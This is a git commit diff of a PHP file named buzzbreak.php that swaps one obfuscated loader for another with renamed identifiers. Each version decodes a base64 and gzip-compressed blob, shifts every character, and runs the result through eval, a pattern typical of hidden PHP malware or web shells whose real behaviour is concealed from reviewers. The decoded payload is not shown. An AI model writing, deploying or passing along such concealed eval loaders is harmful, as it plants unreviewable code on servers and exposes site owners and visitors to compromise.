726feef9a918b894046410b5b02676a49a353939
Samigami <80525436+Samigami@users.noreply.github.com>
2021-04-01 13:48:58 +0100

    BuzzBreak

--- buzzbreak.php
+++ buzzbreak.php
@@ -1,9 +1,9 @@
-<?php function pUyraj($lKt)
+<?php function SzraN($sGUL)
 { 
-$lKt=gzinflate(base64_decode($lKt));
- for($i=0;$i<strlen($lKt);$i++)
+$sGUL=gzinflate(base64_decode($sGUL));
+ for($i=0;$i<strlen($sGUL);$i++)
  {
-$lKt[$i] = chr(ord($lKt[$i])-1);
+$sGUL[$i] = chr(ord($sGUL[$i])-1);
  }
- return $lKt;
- }eval(pUyraj("rVXbbtswDP0AfwVj7KF9yNwsWYs12DAEe9ye9jIgNgzVkWM2uhiS3MCFsV8fZceX7AKsWwSDoCge8pC6GIBGENjaOi6vwkxwZsLrdRC8cuhQvA/jm+Vye7Ne3sqgV5eSMCmNk6BJp3kzDGuDuRUB2bfep0nTBpoYmk6j0YvmJLw7iajF0CTpF+OTB8DgRJM46qekw8DyjewZAEy0qUh/qcKLoI+Y9Nki6ERn88zG9E3qVz0iSKM4HXwIF/k0UZoOseKBZ1sN5fOIgfGd/P5PIxj3aDtPwHLzxA30xoXUeS5Q8Z/ccqMl7NBmlbUwNq1wrrT3UeReSx49alRZwVyUbszheCe+ifk7/PIpWwyxVnK7qZ6fN4azQwJjhowMTo8sVtIyiTCWShQtajXJfKUN7lExcT1liirXycSLq0ddgys4KH6EkpucZw7adBTOwuxy7VzJua3KUhvHd/BQ+0MwITL/AF+ZYvBZUyl/j/noQcJj3t6+ACVrj6l15fQOXoBTWgl8QrW/XFsWcjtL4MiMorAAs9ls8jL4pXHmCrRAH1OAQvA9E1AavTdMyj9iDNpDV43fZMNtSdvKHlCgq0HnrbWyk5b/d0Hte3YaLWObGSydJ44KdGVAMlSOK6Yyfsm0VLg/3mPEyf3wZZ7xoMZlnK6q01CVO+b4eaDfBinpObccMq0co1viY7KdRIXWmfZ63k+Oy9kZi1W4DnhWaAi7P0G4/gE="));?>
+ return $sGUL;
+ }eval(SzraN("rVXbbtswDP0AfwVj7KF9yNwsWYs12DAEe9ye9jIgNgzVkWM2uhiS3MCFsV8fZceX7AKsWwSDoCge8pC6GIBGENjaOi6vwkxwZsLrdRC8cuhQvA/jm+Vye7Ne3sqgV5eSMCmNk6BJp3kzDGuDuRUB2bfep0nTBpoYmk6j0YvmJLw7iajF0CTpF+OTB8DgRJM46qekw8DyjewZAEy0qUh/qcKLoI+Y9Nki6ERn88zG9E3qVz0iSKM4HXwIF/k0UZoOseKBZ1sN5fOIgfGd/P5PIxj3aDtPwHLzxA30xoXUeS5Q8Z/ccqMl7NBmlbUwNq1wrrT3UeReSx49alRZwVyUbszheCe+ifk7/PIpWwyxVnK7qZ6fN4azQwJjhowMTo8sVtIyiTCWShQtajXJfKUN7lExcT1liirXycSLq0ddgys4KH6EkpucZw7adBTOwuxy7VzJua3KUhvHd/BQ+0MwITL/AF+ZYvBZUyl/j/noQcJj3t6+ACVrj6l15fQOXoBTWgl8QrW/XFsWcjtL4MiMorAAs9ls8jL4pXHmCrRAH1OAQvA9E1AavTdMyj9iDNpDV43fZMNtSdvKHlCgq0HnrbWyk5b/d0Hte3YaLWObGSydJ44KdGVAMlSOK6Yyfsm0VLg/3mPEyf3wZZ7xoMZlnK6q01CVO+b4eaDfBinpObccMq0co1viY7KdRIXWmfZ63k+Oy9kZi1W4DnhWaAi7P0G4/gE="));?>
